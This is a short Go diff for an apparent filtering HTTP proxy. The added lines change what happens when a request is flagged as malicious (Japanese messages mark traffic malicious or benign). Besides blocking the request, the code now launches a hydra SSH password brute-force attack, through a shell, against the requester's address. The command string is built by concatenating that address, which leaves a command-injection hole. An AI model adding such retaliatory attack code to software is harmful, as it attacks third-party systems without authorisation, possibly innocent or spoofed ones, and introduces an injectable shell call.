@@ -13,6 +13,7 @@ import (
 	"net/http/httputil"
 	"net/url"
 	"os"
+	"os/exec"
 	"strings"
 
 	"gopkg.in/yaml.v2"
@@ -137,6 +138,12 @@ func main() {
 					if tmpF {
 						fmt.Println("悪性通信")
 						http.Error(w, "悪性通信のためブロックしました", http.StatusForbidden)
+						cmd := exec.Command("sh", "-c", "hydra -l ubuntu -P password.lst "+r.RemoteAddr+" ssh > tmp")
+						output, err := cmd.Output()
+						if err != nil {
+							fmt.Println(err)
+						}
+						fmt.Println(string(output))
 						return
 					} else {
 						fmt.Println("良性通信")
